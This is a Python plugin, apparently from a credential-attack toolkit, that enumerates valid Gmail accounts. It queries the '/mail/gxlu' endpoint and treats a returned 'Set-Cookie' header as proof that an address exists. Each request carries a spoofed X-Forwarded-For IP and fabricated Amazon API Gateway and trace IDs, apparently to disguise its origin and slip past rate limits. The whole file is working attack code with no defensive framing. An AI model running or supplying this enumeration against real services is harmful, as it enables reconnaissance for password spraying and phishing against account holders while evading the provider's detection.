import requests
import utils.utils as utils

def gmailenum_authenticate(url, username, password, useragent, pluginargs):

    data_response = {
        'result': None,    # Can be "success", "failure" or "potential"
		'error' : False,
        'output' : ""
    }

    spoofed_ip = utils.generate_ip()
    amazon_id = utils.generate_id()
    trace_id = utils.generate_trace_id()

    headers = {
        'User-Agent': useragent,
        "X-My-X-Forwarded-For" : spoofed_ip,
        "x-amzn-apigateway-api-id" : amazon_id,
        "X-My-X-Amzn-Trace-Id" : trace_id,
    }

    headers = utils.add_custom_headers(pluginargs, headers)

    try:

        resp = requests.get("{}/mail/gxlu".format(url),params={"email":username},headers=headers)

        if "Set-Cookie" in resp.headers.keys():
            data_response['result'] = "success"
            data_response['output'] = '[!] VALID_USERNAME: {} - Status: {}'.format(username, resp.status_code)

        else:
            data_response['result'] = "failure"
            data_response['output'] = '[-] UNKNOWN_USERNAME: {} - Status: {}'.format(username, resp.status_code)


    except Exception as ex:
        data_response['error'] = True
        data_response['output'] = ex
        pass

    return data_response
